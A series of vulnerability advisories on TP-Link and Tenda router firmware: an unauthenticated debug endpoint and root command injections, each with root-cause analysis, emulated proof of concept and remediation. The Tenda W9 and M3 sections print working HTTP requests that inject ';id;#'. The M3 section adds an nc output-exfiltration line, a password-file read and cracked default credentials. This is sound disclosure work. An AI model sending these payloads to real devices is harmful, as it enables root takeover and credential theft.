![Emulation environment boot: qemu-arm-static chroot of the real rootfs with the firmware Lua 5.1 runtime (LUA_OK)](R5408M_images/fig2.png)

The target is booted at emulation level 3 — `qemu-arm-static` + `chroot` of the genuine rootfs — so the PoC exercises the real firmware controller code rather than a mock.

![PoC run: hooked fork_exec prints the injected /bin/sh -c command line, id returns uid=0(root), listener receives PWNED_CNVD, VERDICT SUCCESS](R5408M_images/fig3.png)

PoC execution transcript — the `[CMD-CONSTRUCTED]` lines show the `domain` payload spliced into the `/bin/sh -c` command line, `/tmp/PWNED_DNS` returns `uid=0(root)`, the listener receives the `PWNED_CNVD` callback, and the run ends with `VERDICT SUCCESS`.

## Impact

An authenticated administrator (or an attacker who has taken over an admin session) can execute arbitrary operating-system commands with root privileges on the router. Root-level command execution allows full device compromise: configuration and credential extraction, firmware manipulation, persistence, and pivoting into the network the router serves.

## Remediation Suggestions

1. Validate the `dns_test` `domain` parameter with a strict character whitelist before concatenation (alphanumerics, dots, and hyphens only); reject `$()`, backticks, semicolons, and other shell metacharacters.
2. Avoid building shell strings for `fork_exec`: switch to argument-array execution (e.g. `fork_execv`/`execv`), or quote every user-derived value with `%q`-style quoting before splicing.
3. Audit all controller-layer parameters that reach `fork_exec`/`system`/`io.popen` for the same outbound-encoding gap, so identical injection paths elsewhere are eliminated.

## References

- Firmware download (from the audit package): <https://media.tp-link.com.cn/software/TL-R5408M%20V1.0%E5%8D%87%E7%BA%A7%E8%BD%AF%E4%BB%B620240126_1.0.4.zip?forcedownload=TL-R5408M%20V1.0%E5%8D%87%E7%BA%A7%E8%BD%AF%E4%BB%B620240126_1.0.4.zip>

## Discoverer

Vulnerability discovered by **JiuZero**.

title: Tenda FH456 V2.0BR V11.11.01.13: goform/ate Debug Interface Unauthorized Access (Pre-Auth, Sensitive Config Exposure)
content:
# Tenda FH456 V2.0BR V11.11.01.13: goform/ate Debug Interface Unauthorized Access (Pre-Auth, Sensitive Config Exposure)

## Vulnerability Type / CWE

- **CWE-306**: Missing Authentication for Critical Function — the factory ATE (Automatic Test Equipment) debug endpoint is enrolled in the HTTP authentication whitelist and reachable without any login

## Affected Product

| Vendor | Product | Model | Firmware filename & version | Severity | Component |
| --- | --- | --- | --- | --- | --- |
| Tenda | FH456 Wireless-N Broadband Router | FH456 V2.0BR | `US_FH456V2.0BR_V11.11.01.13_cn_TDC01.zip` → `US_FH456V2.0BR_V11.11.01.13_cn_TDC01.bin`, version `V11.11.01.13` (compiled 20:25:48 on Nov 17 2015) | High | eCos httpd web server — authentication whitelist data at binary offset 0x1b52d4 (VA 0x801b52d4), auth check code at 0x800487c0–0x80048860 |

Firmware identity verified inside the package: package SHA-256 `6f5858af177afc17a7beaecb0020125a86c0d519ff6beb8e33a2c7ae1ab9613c`; structure ZIP → TRX header (image 880,640 bytes, CRC32 0x8F2EEA84) → LZMA → eCos monolithic flat binary (2,280,620 bytes); architecture MIPSEL on eCos RTOS (Broadcom BCM5356 SoC). In-firmware identification strings: `V11.11.01.13`, `V%s (Compiled at 20:25:48 on Nov 17 2015)`, `<manufacturer>Tenda</manufacturer>`, `<modelName>Wireless-N Router</modelName>`.

## Vulnerability Description

The FH456 V2.0BR firmware is built on the eCos RTOS, and its built-in web server implements HTTP request authentication by checking the requested URL against an authentication whitelist of paths and file extensions that may be accessed without a session.

Static analysis of the LZMA-decompressed eCos monolithic binary shows that the factory-test interface `/goform/ate` (ATE — Automatic Test Equipment) is erroneously present in that whitelist, side by side with static-resource entries such as `/public` and `/favicon.ico`. The ATE interface is Tenda's factory production-test debug channel, used to read and set the device MAC address, WiFi parameters and NVRAM configuration, and to run hardware diagnostics.

Because `/goform/ate` is whitelisted, every HTTP request to it is accepted during the URL matching stage, before any cookie parsing or password comparison. Any attacker on the same network as the router can therefore reach the debug interface with a plain `GET /goform/ate` — no login, no session cookie — and obtain sensitive device configuration or modify device settings.

## Root Cause Analysis

Whitelist data structure — at binary offset 0x1b52d4 (load address 0x801b52d4), the HTTP server stores consecutive null-terminated strings listing unauthenticated URLs, the cookie marker, and unauthenticated file extensions. Hex dump of the region (offsets 0x1b52d4–0x1b5310):

```
001b52d4:  2f70 7562 6c69 6300 2f66 6176 6963 6f6e   /public./favicon
001b52e4:  2e69 636f 0000 0000 6563 6f73 5f70 773d   .ico....ecos_pw=
001b52f4:  0000 0000 6769 6600 6373 7300 6a70 6700   ....gif.css.jpg.
001b5304:  2f67 6f66 6f72 6d2f 6174 6500 6874 7470   /goform/ate.http
```

Parsed entries:

```
0x801b52d4: /public        static resource path, no auth
0x801b52dc: /favicon.ico   site icon, no auth
0x801b52ec: ecos_pw=       cookie name marker
0x801b52f8: gif            image extension, no auth
0x801b52fc: css            stylesheet extension, no auth
0x801b5300: jpg            image extension, no auth
0x801b5304: /goform/ate    ATE debug interface, NO AUTH  <-- vulnerability entry
```

`/goform/ate` sits immediately after the extension whitelist and before the http redirect URL, unambiguously inside the authentication-exemption list.

Authentication check flow — the auth handler near 0x800487c0 first calls the URL-matching routine at 0x8004b068; if the URL matches the whitelist it skips cookie validation entirely, otherwise it proceeds to cookie parsing and password comparison. The MIPSEL disassembly around the branch:

```
0x80048800  0b004010   beqz v0, 0x80048830     ; if URL not in whitelist
0x80048804  2680053c   lui a1, 0x8026
0x80048808  ec52a424   addiu a0, a1, 0x52ec    ; load "ecos_pw=" address
0x8004880c  21306002   move a2, s3
0x80048810  1a2c010c   jal 0x8004b068          ; check cookie
0x80048814  21284002   move a1, s2
```

Because `/goform/ate` is in the whitelist, all of its requests are released at the URL-matching stage and authentication is fully bypassed. Keeping a factory ATE debug interface in the production firmware's auth whitelist is the root-cause defect.

## Exploitation

Preconditions:

- Network reachability of the router's web server. No credentials or session cookie of any kind are required.
- Verification context: the firmware is an eCos RTOS monolithic image for Broadcom BCM5356 with no matching QEMU machine type, so the package verifies exploitability with Unicorn single-function emulation of the real whitelist check plus static parsing of the whitelist data.

Step 1 — send the request without any cookie:

```http
GET /goform/ate HTTP/1.1
Host: <router address>
```

Step 2 — the URL-matching stage resolves `/goform/ate` against the whitelist at 0x801b52d4 and releases the request before any cookie check. The Unicorn simulation of the real check function at 0x800487c0 shows the discriminator:

```
URL "/goform/ate"              -> WHITELIST MATCH -> AUTH BYPASSED
URL "/goform/NetWorkSetupInit" -> NO MATCH -> REQUIRES COOKIE AUTH
URL "/index.htm"               -> NO MATCH -> REQUIRES COOKIE AUTH
URL "/login.asp"               -> NO MATCH -> REQUIRES COOKIE AUTH
```

Step 3 — through the ATE interface an attacker can operate the factory debug functions: read/set the MAC address, read/set WiFi parameters, run hardware diagnostics, and read/set NVRAM configuration — i.e. extract or mutate sensitive device settings without ever authenticating.

## Evidence

![Firmware unpacking and identity: ZIP inflates US_FH456V2.0BR_V11.11.01.13_cn_TDC01.bin, binwalk maps the TRX header (880640 bytes, CRC32 0x8F2EEA84) and LZMA payload (2280620 bytes), and the version/manufacturer strings show V11.11.01.13 compiled Nov 17 2015, Tenda, Wireless-N Router](FH456_images/fig1.png)

![Version strings: grep of the decompressed binary confirms V11.11.01.13 and the compile timestamp V%s (Compiled at 20:25:48 on Nov 17 2015)](FH456_images/fig2.png)

![Unicorn static emulation of the real auth whitelist check at 0x800487c0: all seven whitelist entries parsed, /goform/ate matches and AUTH BYPASSED while /goform/NetWorkSetupInit, /index.htm and /login.asp require cookie auth, ending in VERDICT SUCCESS - /goform/ate is accessible without authentication](FH456_images/fig3.png)

![PoC whitelist parse: the whitelist region hex dump at 0x1b52d4 shows /goform/ate at offset 0x1b5304 inside the auth-exemption list, with VERDICT SUCCESS and the note that an attacker can reach the debug interface via GET /goform/ate without authentication](FH456_images/fig4.png)

Supporting text evidence in the package: `poc-version.transcript` (firmware version extraction), `unicorn-ate-verify.transcript` (whitelist emulation with AUTH BYPASSED), `poc-ate-noauth.transcript` (PoC whitelist analysis), and `evidence-ate-noauth.txt` (hex dump plus auth-flow analysis).

## Impact

- Any network-reachable attacker can invoke the factory ATE debug interface without authentication.
- The interface exposes sensitive operations: MAC address read/write, WiFi parameter read/write, hardware diagnostics, and NVRAM configuration read/write — enabling information disclosure (device and wireless configuration) and unauthorized modification of device settings.
- A debug interface of this power being pre-authorized in production firmware also weakens the overall security posture: any foothold on the LAN translates directly into device reconfiguration.

## Remediation Suggestions

1. Remove `/goform/ate` from the authentication whitelist: modify the whitelist data (at offset 0x1b5304 / VA 0x801b5304) in the web server's auth-check module so the ATE path is no longer exempt from authentication.
2. Disable the ATE interface entirely in production firmware: ATE exists only for factory production testing and should be compiled out of mass-production builds via conditional macros.
3. If remote debug capability is genuinely required, protect the ATE interface with an independent strong authentication mechanism (e.g. HMAC-based token verification) and restrict access to specific interfaces only.
4. Audit the whole authentication whitelist: check whether any other interface paths are exempted from authentication incorrectly; only static resources that truly require anonymous access should remain.

## References

- Vendor product material page (as present in the package): `https://old.tenda.com.cn/material/show/2441`
- The package does not contain a vendor firmware download URL; the firmware image analyzed is `US_FH456V2.0BR_V11.11.01.13_cn_TDC01.zip` (SHA-256 `6f5858af177afc17a7beaecb0020125a86c0d519ff6beb8e33a2c7ae1ab9613c`).

## Discoverer

Vulnerability discovered by **JiuZero**.

title: Tenda W9 V1.0.0.7(4456): goform/exeCommand cmdinput OS Command Injection (Pre-Auth, Root RCE)
content:
# Tenda W9 V1.0.0.7(4456): goform/exeCommand cmdinput OS Command Injection (Pre-Auth, Root RCE)

## Vulnerability Type / CWE

- **CWE-78**: Improper Neutralization of Special Elements used in an OS Command ("OS Command Injection")
- Reachable without authentication per the package report: `exeCommand` sits in the goform dispatch path with no login check, and the injected command runs as root

## Affected Product

| Vendor | Product | Model | Firmware filename & version | Severity | Component |
| --- | --- | --- | --- | --- | --- |
| Tenda | W9 enterprise-grade wireless AP | W9 | `W9V1.0re_V1.0.0.7(4456)_CN.zip` → `US_W9V1.0re_V1.0.0.7(4456)_CN&EN_TDC01.bin`, `fireversion=V1.0.0.7(4456)` | High | `bin/httpd` (`formexeCommand` at 0x4401d0) + `lib/libapcommon.so` (`cmd_get_ping_output` at 0x3c10) |

Firmware identity verified inside the package: package SHA-256 `d0099a10945d7d75cc5b1b683e584ba0a5ea250a75263555e537076938c1ed69` (matches the delivered firmware byte-for-byte); uImage (MIPS, LZMA) embedding a SquashFS little-endian v4.0 xz filesystem (2,840,320 bytes, 634 inodes); inner BIN `US_W9V1.0re_V1.0.0.7(4456)_CN&EN_TDC01.bin` (4,781,140 bytes, dated Aug 30 2019).

## Vulnerability Description

The W9 web management binary `httpd` registers the goform name `exeCommand` in `formDefineTendDa` (0x47b388): at 0x47ba10 `websDefineAction` binds the action name (string at 0x49d804) to the handler `formexeCommand` (GOT 0x4b2f84 → 0x4401d0), making it reachable at `GET /goform/exeCommand`.

The frontend `system.js` sends `cmdinput="ping <ip>"` over this endpoint. The backend `formexeCommand` reads `cmdinput`, skips the first 5 characters (the `ping` prefix), and passes the remainder to `cmd_get_ping_output()` exported by `libapcommon.so` (offset 0x3c10). That function builds a command line with

```
snprintf(buf, 256, "ping %s -%d -c %d -s %d -W %d", ip, ...)
```

and executes it with `popen(buf, "r")`. The `%s` is the unfiltered user string, so semicolons, newlines or `;id;#`-style sequences break out of the ping argument and make `popen` run arbitrary commands.

Authentication and privilege: `httpd` runs as root, so the `popen`-spawned shell is also root. `/goform/exeCommand` is registered in the goform dispatch path alongside interfaces such as `/goform/getLoginInfo`; the firmware's `authSecurityHandler` only whitelists-exempts a few URLs and does not enforce a login check on `exeCommand`, so the request can be triggered unauthenticated.

## Root Cause Analysis

Entry-point location: in `httpd`'s `formDefineTendDa`, the registration

```
0x47ba10:  websDefineAction("exeCommand" /*0x49d804*/, formexeCommand /*GOT 0x4b2f84 -> 0x4401d0*/)
```

routes `GET /goform/exeCommand` to the handler.

Parameter tracking: `formexeCommand` calls `libapcommon.so`'s exported `cmd_get_ping_output` (offset 0x3c10). The function reads the HTTP parameter `cmdinput`; after skipping the `ping ` prefix (5 characters), the remainder is treated as the target IP.

Sink confirmation — instruction-level cross-check with capstone disassembly: the format string `"ping %s -%d -c %d -s %d -W %d"` resides in `libapcommon.so` `.rodata` (file offset 0xc420). The function prologue zeroes a 256-byte stack buffer with `memset`, takes the IP string at `cfg+16` as the `%s` argument to `snprintf`, and immediately calls `popen(buf, "r")` after it returns — exactly the call sequence observed in the emulation harness. No character whitelist exists anywhere on the path.

Taint summary: `cmdinput` (attacker) → `formexeCommand` (strip `ping ` prefix) → `cmd_get_ping_output` (`snprintf` into 256-byte buffer → `popen`). A payload of `;id;#` assembles into

```
ping 127.0.0.1 -c 1 >/dev/null 2>&1;id;# -4 -c 56 -s 3 -W 10
```

where the semicolon starts the injected command and `#` comments out the residual template options.

## Exploitation

Preconditions:

- Network reachability of the AP's web management port. Per the package analysis, `/goform/exeCommand` does not require a login session, so no credentials are needed.
- Verification context: full-chain emulation in WSL2 (binwalk unpack + Unicorn 2.1.2 single-function emulation of the firmware's real `libapcommon.so`), since the package's reproduction harness loads the genuine `.so` and hooks the GOT imports rather than re-implementing the logic.

Step 1 — request shape (as used by the frontend `system.js` and the PoC):

```http
GET /goform/exeCommand?cmdinput=ping%20127.0.0.1%20-c%201%20%3E%2Fdev%2Fnull%202%3E%261%3Bid%3B%23 HTTP/1.1
Host: <device address>
```

Decoded `cmdinput`: `ping 127.0.0.1 -c 1 >/dev/null 2>&1;id;#`.

Step 2 — the backend strips the `ping ` prefix and passes `127.0.0.1 -c 1 >/dev/null 2>&1;id;#` as the IP parameter; `cmd_get_ping_output` assembles and executes:

```
[CMD-CONSTRUCTED] snprintf(cmd,256,'ping %s -%d -c %d -s %d -W %d', ...) =>
    'ping 127.0.0.1 -c 1 >/dev/null 2>&1;id;# -4 -c 56 -s 3 -W 10'
[POPEN] popen('ping 127.0.0.1 -c 1 >/dev/null 2>&1;id;# -4 -c 56 -s 3 -W 10', 'r')
[POPEN-RESULT] len=52 first_line=b'uid=0(root) gid=0(root) groups=0(root),1000(docker)\n'
```

Step 3 — the diagnostic output buffer (which the interface returns to the caller) contains the injected command's result:

```
uid=0(root) gid=0(root) groups=0(root),1000(docker)
[VERDICT] SUCCESS
```

The Unicorn run of `poc_ping_injection.py` against the firmware's own `cmd_get_ping_output` (mapped at 0x10000000, `gp=0x10028c20`) produced the above end-to-end: command construction, `popen` execution, root `id` output, and `VERDICT SUCCESS`.

## Evidence

![Firmware unpacking: extract_firmware.sh verifies SHA-256 d0099a10... against metadata, extracts US_W9V1.0re_V1.0.0.7(4456)_CN&EN_TDC01.bin (4781140 bytes) and the embedded SquashFS at 0x1D9452 (634 inodes), normalizes to ./rootfs with fireversion=V1.0.0.7(4456)](W9_images/fig1.png)

![Asset identification: rootfs/etc_ro/fireversion.cfg reads fireversion=V1.0.0.7(4456)](W9_images/fig2.png)

![Unicorn single-function emulation of the firmware's real cmd_get_ping_output: snprintf assembles ping 127.0.0.1 -c 1 >/dev/null 2>&1;id;# -4 -c 56 -s 3 -W 10, popen executes it, the output buffer contains uid=0(root) gid=0(root) and the run ends with VERDICT SUCCESS](W9_images/fig3.png)

Supporting text evidence in the package: `VULN-001-1-unpack.transcript` (hash verification and unpack log), `VULN-001-2-version.transcript` (firmware version echo), `VULN-001-3-unicorn.transcript` (full injection trace with `uid=0(root)` and `VERDICT SUCCESS`).

## Impact

- An unauthenticated network attacker can execute arbitrary operating system commands as root on the enterprise AP through a single crafted GET request; the diagnostic output channel echoes command results back to the attacker.
- Root-level compromise of a W9 enterprise AP exposes the wireless network it serves: credential and configuration theft, firmware tampering, client traffic interception, and lateral movement.

## Remediation Suggestions

1. Strictly whitelist the `cmdinput` parameter of `/goform/exeCommand`: allow only IPv4/IPv6 address characters (digits, dots, colons, letters a–f and hyphens), cap length at 45 bytes, and reject every other character (`; | & backtick $ < > newline space #`, etc.); validate it as a legitimate IP server-side before it may enter a ping command.
2. Do not splice user input into shell commands: execute ping without a shell — e.g. raw ICMP sockets, or `execvp("/bin/ping", argv)` with a parameter array — eliminating the `popen`/`system` re-parsing step.
3. Add authentication and authorization to goform interfaces: factory/debug endpoints such as `exeCommand`, `telnet`, `ate` and `usbTest` must not be reachable while logged out; add `/goform/exeCommand` to the mandatory-authentication handling so anonymous access is denied.
4. Run the `httpd`-related services with least privilege so that exploitation does not directly yield root.

## References

- Firmware download (as present in the package): `https://static.tenda.com.cn/tdcweb/download/uploadfile/W9/W9V1.0re_V1.0.0.7(4456)_CN.zip`
- CWE-78: OS Command Injection (`https://cwe.mitre.org/data/definitions/78.html`, cited in the package report)

## Discoverer

Vulnerability discovered by **JiuZero**.

title: Tenda M3 V1.0.0.12(4856): goform/setFixTools hostName OS Command Injection (Authenticated, Root RCE)
content:
# Tenda M3 V1.0.0.12(4856): goform/setFixTools hostName OS Command Injection (Authenticated, Root RCE)

## Vulnerability Type / CWE

- **CWE-78**: Improper Neutralization of Special Elements used in an OS Command ("OS Command Injection")
- The injected command executes as root and its output is echoed back into the HTTP response via the vulnerable function's own `fread()` channel, giving an output-visible remote root command execution

## Affected Product

| Vendor | Product | Model | Firmware filename & version | Severity | Component |
| --- | --- | --- | --- | --- | --- |
| Tenda | M3 wireless AP controller (hotel/ceiling AP controller, in-firmware model string `M3V1.0`) | M3 | `US_M3V1.0BR_V1.0.0.12(4856)_CN&EN_TDC&TDE01.zip` → `US_M3V1.0BR_V1.0.0.12(4856)_CN&EN_TDC&TDE01.bin`, `fireversion=V1.0.0.12(4856)` | Critical | `bin/httpd` (GoAhead-derived Tenda goform CGI, `formSetFixTools`) and `lib/libtpi.so` (`tpi_get_ping_output`) |

Firmware identity verified inside the package: image 9,733,937 bytes, SHA-256 `afaa7fcec28647f3419ae8f738b7bf8d73796347f3dab2d87802a1d165a2834e`, MD5 `40fb3c91159ad1f682c4ce473028c8a8`; u-boot legacy uImage Linux/ARM LZMA, kernel 8,867,840 bytes, load 0x80000000 / entry 0xC0008000, built Tue Mar 26 05:42:27 2019; SquashFS superblock at image offset 1,796,576 (7,067,486 bytes), 249 files + 154 symlinks. Architecture: ARM 32-bit, EABI5, uClibc. Attack entry: management HTTP port 80, `POST /goform/setFixTools`, parameter `hostName`.

## Vulnerability Description

The M3 web management service exposes the "network diagnosis / fixed tools" feature. The frontend submits the ping/traceroute target as the `hostName` field of `POST /goform/setFixTools`. This field passes through the whole processing chain with no character filtering or type validation:

1. `bin/httpd`'s unified CGI entry `webs_Tenda_CGI_BIN_Handler` (VA 0x31f58) dispatches the URL name to `formSetFixTools` (in `.text`, from about 0x4a488) with no filtering.
2. `formSetFixTools` reads each field with the Tenda-internal GetValue helper (`fcn.00027768`); `hostName` is then copied by plain `strncpy` into offset `+0x10` of the parameter block passed to the diagnostics library — no length limit, no whitelist. By contrast, sibling numeric fields (`packageNum`, `packageSize`, `pro_ver`) are passed through `atoi()`, showing the authors did type-convert numbers but left the string field unchecked.
3. `lib/libtpi.so`'s exported `tpi_get_ping_output` (library VA 0x6060, symbol size 0x304 = 772 bytes) builds the command line with `sprintf` using the fixed template `"ping %s -%d -c %d -s %d -W %d"` (template at `.rodata` VA 0xbd38) — the `%s` is the unfiltered `hostName` — and passes the whole line to `popen()` (import `imp.popen`, PLT stub 0x18E0), which hands it to `/bin/sh -c`.

Since `httpd` runs as root (no privilege dropping in this firmware family), injected commands execute as root; additionally, `tpi_get_ping_output` reads the command output with `fread()` (PLT 0x1B2C) and the result is written back into the HTTP response by `formSetFixTools`, so the attacker gets the command output directly rather than blind-executing. The firmware's string preprocessing helpers (`fcn.0004d530`, `fcn.0004d6fc`) only trim leading/trailing spaces (0x20) and skip slashes/backslashes — they block no shell metacharacters — and the `hostName` branch does not even call them.

The same library also exports `tpi_get_traceroute_output` (start 0x6364, symbol size 0x288 = 648 bytes) with the sibling template `"traceroute %s -p %d -m %d -q %d -w %d"` (VA 0xbd9c) and an identical sprintf→popen structure, and `httpd` contains 20+ further `doSystemCmd()` call sites of the same string-concatenation pattern (`formSetPortIsolation`, `formexeCommand`, `formhandleSysLog`, `formEmailTest`, `formSetLocalWorkMode`, `formSetPicListItem`, `formDelAd`, `formSetAdInfoDetail`, `obtain_auth_pic`, etc.).

## Root Cause Analysis

Sink function (reconstructed from the real ARM instructions of `tpi_get_ping_output`):

```c
/* lib/libtpi.so tpi_get_ping_output, .text 0x6060, symbol size 772 bytes.
 * Vendor source: tpi_systool.c near line 1266 (revealed by the debug string).
 * arg0 is the parameter block; arg0+0x10 (hostName) is strncpy'd there by
 * bin/httpd formSetFixTools from POST /goform/setFixTools without filtering. */
char cmd[4096];
char *host = (char *)arg0 + 0x10;              /* fully attacker-controlled */

/* 0x622c: call imp.sprintf, template at .rodata 0xbd38 */
sprintf(cmd, "ping %s -%d -c %d -s %d -W %d",
        host,                                  /* %s gets raw user input */
        *(int *)(arg0 + 0x00),                 /* address family */
        *(int *)(arg0 + 0x04),                 /* packageNum */
        *(int *)(arg0 + 0x08),                 /* packageSize */
        *(int *)(arg0 + 0x0c));                /* timeout */

FILE *fp = popen(cmd, "r");                    /* 0x628c: shell interprets cmd, runs as root */
if (fp) {
    n = fread(outbuf, 1, CAP - 1, fp);         /* 0x6318: command output read back */
    pclose(fp);                                /* 0x6334 */
    /* n is copied into the formSetFixTools HTTP response -> echo channel */
}
```

Key instructions and locations (cross-checked with `readelf --dyn-syms`, `nm -S` and radare2 `is`; disassembly in the package's `tpi_get_ping_output.asm` and import list `r2_imports.txt`):

```
tpi_get_ping_output   VA 0x6060 (size 0x304 / 772 bytes)
0x622c  bl imp.sprintf   (PLT 0x1BC8)   template .rodata 0xbd38 "ping %s -%d -c %d -s %d -W %d"
0x628c  bl imp.popen     (PLT 0x18E0)   <-- injection sink
0x6318  bl imp.fread     (PLT 0x1B2C)   output echo channel
0x6334  bl imp.pclose    (PLT 0x194C)
```

A residual debug template `"Debug->%s: %s(%d)--cmd:%s"` expands at runtime to `Debug->tpi_systool.c: tpi_get_ping_output(1266)--cmd:` followed by the complete assembled command line — confirming the vendor source file is `tpi_systool.c` with the sink near line 1266, and that the vendor itself treats the command as one concatenated string.

Taint path: `POST /goform/setFixTools` (`hostName`) → `webs_Tenda_CGI_BIN_Handler` (0x31f58, no filtering) → `formSetFixTools` (GetValue `fcn.00027768`, `strncpy` to param block +0x10) → `tpi_get_ping_output` (sprintf 0x622c → popen 0x628c). Fix point: `libtpi.so:tpi_get_ping_output` (0x6060); pollution introduction point: `formSetFixTools`'s unfiltered `strncpy` of `hostName`.

## Exploitation

Preconditions:

- Access to the management HTTP port (default 80). `setFixTools` is a diagnostic interface protected by the web login session gate — an unauthenticated `/goform/setFixTools` request is 302-redirected to `login.html` (verified against the emulated real `httpd`), so a valid management session is required.
- The login gate is weak by default: `etc_ro/passwd_private` ships DESCrypt hashes for `admin`, `support`, `user` and `nobody`, all cracked in the package to the factory password `1234` (salts `6H`, `Ea`, `tG`, `VB`); `webroot_ro/default.cfg` additionally stores `sys.userpass=YWRtaW4=` (base64 of `admin`). Login is `POST /login/Auth` with the `pwd` field base64-encoded (per `login.html`'s `str_encode = base64encode(utf16to8(str))`).

Step 1 — send the diagnostic request with the injected `hostName` (URL-decoded to `;id;#`; the `#` comments out the template's residual `-4 -c 4 -s 56 -W 1` options):

```http
POST /goform/setFixTools HTTP/1.1
Host: <device address>
Content-Type: application/x-www-form-urlencoded

hostName=%3Bid%3B%23&default=ping&timeout=1&packageNum=4&packageSize=56&pro_ver=4&tcpStatus=&pingType=0
```

Step 2 — the firmware assembles and executes (captured command line):

```
ping ;id;# -4 -c 4 -s 56 -W 1
```

The semicolons break out of the argument; `id` executes with the privileges of `httpd` (root) and the `#` neutralizes the residual options.

Step 3 — verification. The package validates the identical sink chain at two independent levels: (1) Unicorn 2.1.2 instruction-level emulation of the real `tpi_get_ping_output` ARM code (772 bytes) with only the six imports simulated; (2) native ARM user-mode execution — `harness.c` cross-compiled and linked directly against the firmware's own `lib/libtpi.so` under qemu-user with binfmt_misc, so `sprintf`/`popen`/`fread`/`pclose` are the firmware's real implementations and the `popen()`-spawned `/bin/sh` actually executes. Both levels produce:

```
[CMD-CONSTRUCTED] ping ;id;# -4 -c 4 -s 56 -W 1
Debug->tpi_systool.c: tpi_get_ping_output(1266)--cmd:ping ;id;# -4 -c 4 -s 56 -W 1
[EXEC] host runs: /bin/sh -c 'ping ;id;# -4 -c 4 -s 56 -W 1'
[EXEC-OUTPUT] uid=0(root) gid=0(root) groups=0(root)
[RESULT] bytes of injected-command output copied back into formSetFixTools response buffer: 87
VERDICT SUCCESS - injected command reached the shell
```

Step 4 — impact demonstrations in the package: an outbound channel (`;id|nc -w 3 127.0.0.1 4445;#` delivers `uid=0(root) ...` to a listener), a root-owned file drop (`;echo VULN-001-NATIVE > /tmp/NATIVE_PWNED;#` creates a root-owned file in the device), and a sensitive-file read (`;cat /etc_ro/passwd_private;#` echoes the device's full password table, whose hashes were cracked to `1234`).

## Evidence

![Firmware identity: sha256 afaa7fce... / md5 40fb3c91... of US_M3V1.0BR_V1.0.0.12(4856)_CN&EN_TDC&TDE01.bin and binwalk unpacking of the TRX/LZMA uImage into squashfs-root](M3_images/fig1.png)

![Vulnerable component verification: readelf -h of lib/libtpi.so shows the ARM EABI5 shared object whose exported tpi_get_ping_output (0x6060, 772 bytes) is the injection sink; its SHA-256 matches the in-package copy](M3_images/fig2.png)

![Baseline Unicorn run of the real tpi_get_ping_output with benign hostName=127.0.0.1: the firmware code assembles ping 127.0.0.1 -4 -c 4 -s 56 -W 1, popen() executes it, fread returns 425 bytes, proving the emulation exercises the genuine sink chain](M3_images/fig3.png)

![Injection run with hostName=';id;#': the assembled line ping ;id;# -4 -c 4 -s 56 -W 1 reaches popen(), the shell prints uid=0(root) gid=0(root) groups=0(root), 87 bytes are copied back into formSetFixTools' response buffer, VERDICT SUCCESS](M3_images/fig4.png)

Supporting text evidence in the package: `VULN_001-01-hash.transcript` through `VULN_001-10-native-leak.transcript` (hash, version, emuboot, poc-id, listener, native baseline/inject/file/passwd/leak traces) and `httpreq-dump.txt` (the exact HTTP request captured on the wire).

## Impact

- A single HTTP request executes arbitrary OS commands as root on the wireless controller, with the command output echoed into the HTTP response — no blind injection required.
- Consequences demonstrated in the package: reading `/etc_ro/passwd_private` and exfiltrating credential hashes, writing root-owned files, and establishing outbound connections for interactive shells.
- On a hotel wireless AP controller, root compromise enables traffic interception for connected clients, firmware tampering, persistence (the firmware also carries the TendaTelnet debug backdoor that can start `telnetd`), and lateral movement into the internal network.

## Remediation Suggestions

1. Source whitelist validation (fastest stopgap): in `formSetFixTools`, validate `hostName` immediately after reading — allow only digits, letters, dots, underscores, hyphens and colons (legal IPv4/IPv6/hostname charset); reject any input containing semicolons, pipes, ampersands, backticks, dollar signs, parentheses, angle brackets, spaces or newlines; limit length to 63 bytes. Never pass an unvalidated string into `sprintf`.
2. Eliminate the shell (preferred root fix): replace `popen` string assembly with fork + parameterized `execv` and pipe-based output collection:

```c
char *argv[] = { "ping", "-4", num_buf, "-c", cnt_buf,
                 "-s", size_buf, "-W", to_buf, host_buf, NULL };
execv("/bin/ping", argv);   /* no shell; metacharacters are inert */
```

   Both `tpi_get_ping_output` and the same-family `tpi_get_traceroute_output` (template `traceroute %s -p %d -m %d -q %d -w %d`) must be converted.
3. Tighten numeric parameters: `pro_ver`, `packageNum`, `packageSize`, `timeout` currently pass through `atoi()` only; use `strtol` with range checks (e.g. packageNum 1–10, packageSize 1–65507, timeout 1–10, pro_ver restricted to 4 or 6).
4. Consolidate sibling sinks: unify the 20+ `doSystemCmd()` call sites in `httpd` (`formSetPortIsolation`, `formexeCommand`, `formhandleSysLog`, `formEmailTest`, `formSetLocalWorkMode`, `formSetPicListItem`, `formDelAd`, `formSetAdInfoDetail`, `obtain_auth_pic`, etc.) and the TendaTelnet direct `system()` calls (`killall -9 telnetd` and background `telnetd` start at 0x469fc) onto a parameterized execution interface that never accepts external strings.
5. Least privilege: do not run `httpd` as root; split diagnostics into a restricted child process with only `CAP_NET_RAW`; remove the telnetd debug backdoor and the predictable pseudo-hash passwords in `etc_ro/passwd_private` from production firmware.
6. Defense in depth and interim mitigation: enforce login-session checks on `/goform` paths and restrict management access to the management port/intranet; add CGI rate limiting and login lockout; alert on abnormal characters in `popen` arguments. Until a vendor update is available, block `/goform/setFixTools` and other non-essential diagnostic endpoints at the gateway, or remove WAN reachability of the web management port.

## References

- Firmware download (as present in the package): `https://static.tenda.com.cn/tdcweb/download/uploadfile/M3/US_M3V1.0BR_V1.0.0.12(4856)_CN&EN_TDC&TDE01.zip`
- Firmware image analyzed: `US_M3V1.0BR_V1.0.0.12(4856)_CN&EN_TDC&TDE01.bin` (SHA-256 `afaa7fcec28647f3419ae8f738b7bf8d73796347f3dab2d87802a1d165a2834e`, MD5 `40fb3c91159ad1f682c4ce473028c8a8`).

## Discoverer

Vulnerability discovered by **JiuZero**.
